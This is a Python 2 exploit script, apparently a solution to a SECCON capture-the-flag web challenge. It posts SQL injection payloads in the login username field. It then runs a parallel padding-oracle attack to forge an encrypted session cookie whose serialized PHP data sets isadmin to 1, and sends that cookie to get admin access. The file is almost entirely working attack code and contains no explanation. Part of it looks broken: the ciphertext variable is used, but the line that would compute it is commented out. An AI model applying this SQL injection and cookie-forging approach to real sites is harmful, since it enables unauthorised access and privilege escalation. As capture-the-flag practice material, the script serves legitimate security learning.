import requests
import urllib
import hexdump
from multiprocessing import Pool

session = requests.Session()
local = False
if not local:
	URL = 'http://biscuiti.pwn.seccon.jp/'
else:
	URL = 'http://0.0.0.0/'
def go(id, pw, verbose=False):
	if verbose:
		print [id, pw]
	data = {
		'username': id,
		'password': pw
	}
	# print urllib.urlencode(data)
	# exit()
	r = session.post(URL, data=data)
	if verbose:
		print r.text
	if 'set-cookie' in r.headers:
		return urllib.unquote(r.headers['set-cookie'].split('JSESSION=')[1].split(';')[0]).decode('base64')

def worker(args):
	id, pw, iv = args
	return go(id, pw) is None

import codecs

def escape(s, errors="strict"):
    encodable = s

    nul_index = encodable.find("\x00")

    if nul_index >= 0:
        error = UnicodeEncodeError("NUL-terminated utf-8", encodable,
                                   nul_index, nul_index + 1, "NUL not allowed")
        error_handler = codecs.lookup_error(errors)
        replacement, _ = error_handler(error)
        encodable = encodable.replace("\x00", replacement)

    return "\"" + encodable.replace("\"", "\"\"") + "\""

def oracle_padding(target):
	global worker
	data = go("' UNION SELECT x'" + ('b' * 10 + pad(target)).encode('hex') + "', 1-- -", '', True)
	mac = data[-16:]
	data = data[:-16]
	plaintext = pad(data)
	print `plaintext`
	print `data[-32:-16]`

	iv = '\x00' * 16
	result = ''
	while True:
		iv = list(iv)
		for i in range(15):
			queue = []
			for j in range(256):
				iv[15 - i] = chr(j)
				queue.append(("' UNION SELECT 1, '" + (''.join(iv) + mac).encode('base64').replace('\n', '') + "'-- -", '', list(iv)))
			j = pool.map(worker, queue).index(True)
			iv = list(queue[j][2])
			print `iv`
			if i < 14:
				for k in range(i + 1):
					iv[15 - k] = chr(ord(iv[15 - k]) ^ (i + 1) ^ (i + 2))
		queue = []
		for j in range(256):
			queue.append(("' UNION SELECT 1, '" + (''.join(iv) + mac).encode('base64').replace('\n', '') + "'-- -", chr(j), iv))
		j = pool.map(worker, queue).index(False)
		print 15, j
		# padding valid
		iv[0] = chr(j ^ ord(iv[0]))
		iv = [iv[0]] + [chr(ord(iv[i]) ^ 0xf) for i in range(1, 16)]
		mac = ''.join(chr(ord(x) ^ ord(y)) for x, y in zip(plaintext[-16:], iv))
		plaintext = plaintext[:-16]
		print iv, `mac`
		if mac == '\x00' * 16:
			break
		else:
			result = mac + result

	return result

if __name__ == '__main__':
	pad = lambda c: c + chr(16 - len(c) % 16) * (16 - len(c) % 16)
	pool = Pool(50)
	target = 'a:2:{s:4:"name";i:1;s:7:"isadmin";i:1;}'
	# ciphertext = oracle_padding('a' * 16)
	print `ciphertext`
	result = ''
	iv = '\x00' * 16
	for i in range(0, len(target), 16):
		iv = oracle_padding(str(bytearray(ord(x) ^ ord(y) ^ ord(z) for x, y, z in zip(iv, ciphertext[16:32], pad(target)[i:i+16]))))[32:48]
		print `iv`
		result += iv
	mac = result[-16:]

	headers = {
		'Cookie': 'JSESSION=' + (target + mac).encode('base64').replace('\n', '')
	}

	r = session.get(URL, headers=headers)
	print r.text